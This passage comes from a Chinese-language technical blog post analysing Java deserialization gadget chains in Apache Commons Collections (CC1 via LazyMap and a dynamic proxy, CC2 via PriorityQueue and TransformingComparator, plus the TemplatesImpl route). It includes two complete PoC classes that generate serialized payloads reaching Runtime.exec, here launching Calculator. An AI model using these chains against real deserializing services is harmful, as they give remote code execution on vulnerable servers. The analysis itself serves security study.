src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513160306511.png" alt="image-20210513160306511"></p><p>目前已有条件：</p><ul><li>AnnotationInvocationHandler的readObject方法可以触发setValue，</li><li>cc里面很多Map的setValue方法可以调用transform方法</li><li>LazyMap的invoke可以调用Map.get方法，LazyMap重写的get方法可以触发transform方法</li><li>ChainedTransformer的transform方法可以将里面InvokerTransformer的内容进行成环invoke触发</li></ul><p>这个感觉就像：</p><p>handler是一个InvocationHandler类对象，他内部有invoke方法</p><p>我们可以做一个代理类a，让这个代理类代理LazyMap对象,handler也参与，负责invoke</p><p>这样的话，无论以后a调用了LazyMap内部的任何方法，他都会先走一遍handler的invoke方法。</p><p>注意最后一句话，我们想让”他都会先走一遍handler的invoke方法”，handler的<strong>invoke方法</strong>，<strong>就是LazyMap的invoke方法</strong>。</p><p>抱着这个目标，我们还可以发现:</p><ul><li>AnnotationInvocationHandler继承了InvocationHandler，它也可以当动态代理，也可以作为handler</li></ul><p>所以我们可以：</p><ul><li>先拿到AnnotationInvocationHandler的构造函数cons</li><li>先用cons做一个AnnotationInvocationHandler的实例h1，h1的memberValues属性是一个LazyMap(包装好innermap和chain)</li><li>再用h1参与Proxy.newProxyInstance，去做一个LazyMap的代理实例mapProxy</li><li>再用cons去做一个AnnotationInvocationHandler的实例h2，h2的memberValues属性是mapProxy</li></ul><p>这时候h2作为payload，参与序列化操作。</p><p>我们主要关注反序列化：</p><p>断点下到第一个readObject位置，java.io.ObjectInputStream#readSerialData：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513170527485.png" alt="image-20210513170527485"></p><p>slots数组里面的内容就是h2，可以看到类型是AnnotationInvocationHandler</p><p>接下来会走到java.io.ObjectInputStream#invoke方法，可以看到ma=readObject，obj=h2</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171248714.png" alt="image-20210513171248714"></p><p>先在AnnotationInvocationHandler.readObject下断点，然后over-step:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171910871.png" alt="image-20210513171910871"></p><p>果然进入到readObject方法，理论上现在this.memberValues就是我们传进来的mapProxy参数。</p><p>mapProxy是一个动态代理，它代理了LazyMap这个类，handler是h1。</p><p>那么这里一但mapProxy调用了任何方法，都会走handler(h1)的invoke方法，<strong>this.memberValues.entrySet()就是一次调用</strong></p><p>这里可以先在AnnotationInvocationHandler类的invoke处下一个断点，然后step-over：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182135950.png" alt="image-20210513182135950"></p><p>这里继续往下看，发现AnnotationInvocationHandler类的invoke调用了this.memberValues.get()：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182402111.png" alt="image-20210513182402111"></p><p>这会再一次触发h1的invoke函数，并且现在this.memberValues的值为h1的参数，类型是LazyMap，factory就是lazymap属性，就是我们传进去的chain，的那么就会进入LazyMap.get方法：</p><p>LazyMap.get内部就会有transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513183528337.png" alt="image-20210513183528337"></p><p>如果当前factory是我们的chain，那就会触发RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject() -&gt; </span><br><span class="line">  AnnotationInvocationHandler.readObject() -&gt; </span><br><span class="line">  <span class="keyword">this</span>.memberValues.entrySet() = mapProxy.entrySet() -&gt;</span><br><span class="line">  AnnotationInvocationHandler.invoke() -&gt; </span><br><span class="line">  <span class="keyword">this</span>.memberValues.get(xx) = LazyMap.get(not_exist_key) -&gt; </span><br><span class="line">  ChainedTransformer.transform() -&gt; InvokerTransfomer.transform() -&gt; </span><br><span class="line">  RCE</span><br></pre></td></tr></table></figure><h4 id="最终版本PoC-1"><a href="#最终版本PoC-1" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_LazyMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建携带着LazyMap的AnnotationInvocationHandler实例h1</span></span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h2><p>条件：</p><ul><li><strong>commons-collections4: 4.0</strong></li><li>jdk1.7 1.8低版本</li></ul><p>maven：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>预备知识：</p><p><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">javassist</a></p><p><a href="https://0range228.github.io/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/" target="_blank" rel="noopener">JVM类加载机制</a></p><h3 id="利用链寻找-2"><a href="#利用链寻找-2" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>第一件事依然是寻找readObject复写点，这次盯上的是jdk的<strong>PriorityQueue</strong>：</p><blockquote><p>PriorityQueue 优先级队列是基于优先级堆的一种特殊队列 , 它满足队列 “ 队尾进 , 队头出 “ 的特点 </p><p><strong>队列中每次插入或删除元素时 , 都会调用 Comparator 方法对队列进行调整</strong> </p><p><strong>缺省情况下 , 优先级队列会根据自然顺序对元素进行排序 , 形成一个最小堆( 父节点的键值总是小于或等于任何一个子节点的键值 ) . 当指定了Comparator后 , 优先级队列会根据Comparator的定义对元素进行排序.</strong></p></blockquote><p>梳理了一下PriorityQueue类的流程：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514104821773.png" alt="image-20210514104821773"></p><p>可以看到queue和comparator都是进行了可控性的传递。</p><p>那这里我们继续寻找哪些实现了Comparator接口的类拥有compare方法，目标锁定到<strong>TransformingComparator</strong>：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514120620377.png" alt="image-20210514120620377"></p><p>哦这熟悉的transformer.transform 可控！</p><p>但是他并不像ChainedTransformer一样是成环transform，仅仅调用了一次Comparator.compare。</p><h3 id="TransformingComparator版本"><a href="#TransformingComparator版本" class="headerlink" title="TransformingComparator版本"></a>TransformingComparator版本</h3><h4 id="最终版本PoC-2"><a href="#最终版本PoC-2" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><p>这里完全可以借助这一点，写一版PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2_TransformingComparator_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] raw_payload = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /Applications/Calculator.app"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(raw_payload);</span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc2_TransformingComparator.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc2_TransformingComparator.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>细节</p><ol><li>为什么put了两个值：</li></ol><p>因为在heapify方法实现如下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514110829082.png" alt="image-20210514110829082"></p><p>这里只有size&gt;1才能进入循环。</p><ol start="2"><li>add做了什么事？</li></ol><p>两次add做了什么事，这里要force-step(红色的小箭头)进入</p><p>调用梳理如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add() -&gt; offer() -(第二次才会)-&gt; siftUp() -&gt; siftUpComparable()</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112304003.png" alt="image-20210514112304003"></p><p>第二次：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112556522.png" alt="image-20210514112556522"></p><p>由于我们没有设置comparator，所以会进入else分支：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112722687.png" alt="image-20210514112722687"></p><p>siftUpComparable方法只是把元素放到队列里，并没有做什么事：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514113611190.png" alt="image-20210514113611190"></p><ol start="3"><li>为什么还反射来构造函数来修改值？</li></ol><p>因为为了可以满足赋值，需要让comparator属性为null，才能继续走：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112722687.png" alt="image-20210514112722687"></p><p>当我们再次反射，是为了可以在之后的readObject里面使用comparator属性来调用compare方法，我们需要给他赋值恶意chain。</p><h4 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h4><ol><li>payload：PriorityQueue（2，TransformingComparator(transformer = chain)）</li><li>对于PriorityQueue来说，他的comparator就是TransformingComparator(transformer = chain)这一串东西。</li><li>首先肯定是进入PriorityQueue的readObject方法，一路走。</li><li>之后重点在PriorityQueue的siftDown方法中，会校验comparator是否为null，显然不是，进入siftDownUsingComparator方法。</li><li>之后在siftDownUsingComparator进行了comparator.compare，下图显示</li><li>由于comparator是TransformingComparator类对象，所以进入TransformingComparator的compare方法</li><li>这时TransformingComparator对象的this.transformer属性就是chain，chain.transform成环调用，触发。</li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514122321048.png" alt="image-20210514122321048"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514122515406.png" alt="image-20210514122515406"></p><p>第一个transform就会触发。</p><h3 id="TemplatesImpl版本"><a href="#TemplatesImpl版本" class="headerlink" title="TemplatesImpl版本"></a>TemplatesImpl版本</h3><p>ysoserial用的是这个版本</p><blockquote><p>之前提到过，TransformingComparator的compare内部并不像ChainedTransformer的transform一样是成环transform。</p></blockquote><p>ysoserial把目光聚焦在了TemplatesImpl里面</p><p>TemplatesImpl位于rt.jar下的sun包里面，源码分析：</p><p>TemplatesImpl这个类有两个属性：</p><ul><li>_bytecodes：byte[] 字节码的字节数组</li><li>_class: Class[] 根据 _bytecode 生成的Class对象</li></ul><p>可以看到：</p><p>getTransletInstance</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514132343726.png" alt="image-20210514132343726"></p><p>defineTransletClasses</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514115801660.png" alt="image-20210514115801660"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514115709993.png" alt="image-20210514115709993"></p><p>我们都知道静态代码块可以在类加载的同时执行，所以我们只要生成一个类，这个类的静态代码块里执行恶意命令。</p><p>所以这里我们就要找，哪里可以调用getTransletInstance方法，</p><p>发现在本类的newTransformer里面调用了getTransletInstance：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514133144671.png" alt="image-20210514133144671"></p><p>那哪里调用了newTransformer方法呢？发现在getoutputProperties里调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514133248367.png" alt="image-20210514133248367"></p><p>这部分有点乱画个调用图：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514183849675.png" alt="image-20210514183849675"></p><p>所以到目前为止，我们的收获：</p><ol><li>PriorityQueue的readObject可以走到Comparator接口的compare方法</li><li>TransformingComparator是Comparator的实现类，TransformingComparator的transform方法会调用Tranformer接口的transform函数</li><li>另一方面，TransformerImpl的newTransformer的一系列操作可以将_bytecode数组里面的内容加载进虚拟机，获得一个AbstractTranslet类的对象</li><li>创建这个对象的时候，Class类对象里的静态代码块必将被执行</li></ol><p>所以现在的问题就是，如何将一个实现了Tranformer接口的类，他的transform方法和TransformerImpl的newTransformer结合到一起。</p><h4 id="纽带"><a href="#纽带" class="headerlink" title="纽带"></a>纽带</h4><p>我们发现TransformingComparator的构造函数可以将Transformer类放入自身<em>transformer</em>类属性：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514142610125.png" alt="image-20210514142610125"></p><p>隐隐约约感觉能连上！</p><p>ysoserial的思路是将恶意操作放在一个类的静态代码块中，将这个类的bytecode传递给某个可控参数，最终传递给invoke函数命令执行。</p><p>开始构造PoC：</p><p>构造流程:</p><ol><li>首先我们要有一个PriorityQueue对象pq在最外面，作为readObject的入口</li><li>javassist生成一个恶意类，它的静态代码块中有恶意命令，获得这个恶意类的字节数组</li><li>拿到之后如何传递到链中，我们的payload说到底是一个static代码块，最理想的情况就是它被newInstance了，那我们就要找哪些方法可以做到，等等，好像不需要再找了，因为前文提到的TemplatesImpl的_bytecode数组内容在TemplatesImpl的getTransletInstance方法中被defineClass了</li><li>那么，现在问题就来到哪些类可以调用getTransletInstance方法呢？发现正巧的是TemplatesImpl自己的newTransformer就可以调用</li><li>所以现在就来到哪里可以调用newTransformer方法，发现没有，但是我们降维武器反射，这里需要用InvokeTransformer[]来包装一下“newTransformer”</li><li>现在还需要一个TemplatesImpl对象tmpl来帮我们做纽带，并且将这个对象的bytecode属性设置为恶意类，还要保证属性name不为null</li><li>tmpl现在的bytecode属性内容就是恶意类，所以调用tmpl的newTransformer方法就可以了！</li></ol><h4 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h4><ol><li><p>为什么恶意类要继承AbstractTranslet？</p><p>因为TemplatesImpl的defineTransletClasses方法中有个判断，如果当前恶意类的父类不是AbstractTranslet的话，<code>_tranletIndecx</code>的值就是初始值-1。但是对于我们，class[0]就是我们的恶意类的Class对象，后续的newInstance离不开它，所以我们当然希望<code>_tranletIndex</code>的值就是0。</p></li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514163650043.png" alt="image-20210514163650043"></p><p>为什么<code>_tranletIndex</code>的值一定要是0呢？？？因为我们可以看到在TemplatesImpl的getTransletInstance中：<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514164219670.png" alt="image-20210514164219670"></p><p><code>_transletIndex</code>决定了<code>_class</code>数组的检索位置。</p><ol start="2"><li>为什么<code>_name</code>和<code>_class</code>属性要为null？</li></ol><p>因为在getTransletClasses中，只有满足这两个方法，才能进入defineTransletClasses：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514164740087.png" alt="image-20210514164740087"></p><ol start="3"><li>为什么要改<code>size</code>的值？</li></ol><p>因为在heapify()中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514165822726.png" alt="image-20210514165822726"></p><p>PriorityQueue的size属性默认是0，在这就会断掉。</p><ol start="4"><li>为什么不能直接给PriorityQueue的queue属性去赋值？非要用反射？</li></ol><p>queue的值其实会在compare中当作参数，所以一定要有值。</p><p>不能直接赋值是因为：</p><p>抛开queue属性是private transient Object[] queue;</p><p>queue属性以及其长度都是初始化时候得到的</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514172000161.png" alt="image-20210514172000161"></p><p>好的现在如果是queue.add()的话：</p><p>只改一个地方：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514172637366.png" alt="image-20210514172637366"></p><p>(其实这里面只add一次tmpl也是可以的)</p><p>第一次是2，他会先进行一个自动装箱，变成new Integer(2)，因为PriorityQueue接受Obejct泛型。</p><p>第一次由于size是初始值0，所以只是老实的进入queue[0]，size变成1</p><p>第二次由于是i=size，目前size是1，会进入siftUp函数</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173317035.png" alt="image-20210514173317035"></p><p>然后进入siftUpUsingComparator：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173453769.png" alt="image-20210514173453769"></p><p>这里多说几句，可以看到k，x两个参数1和tmpl</p><p>parent是0，e=queue[1]也就是Integer(1)</p><p>接下来会进入comparator的compare方法；</p><p>来到第一个tranform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173727496.png" alt="image-20210514173727496"></p><p>仔细看的话可以看出来obj1是上面siftUpUsingComparator函数的第二个函数x也就是Tmpl，obj2是上面的e，就是第一次传进去的值2</p><p><strong>这里就会提前触发调用链，利用失败。</strong></p><p>多说一句，就算绕过这里，在第三行this.decorated.compare语句又会走向哪里？</p><p>我们当前传进来的comparator采用的是第一个构造函数，只有一个InvokerTransformer[]</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514174908649.png" alt="image-20210514174908649"></p><p>这里面第二个参数是什么？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514174938291.png" alt="image-20210514174938291"></p><p>再点进去发现是包装类的compareTo方法：</p><p><img 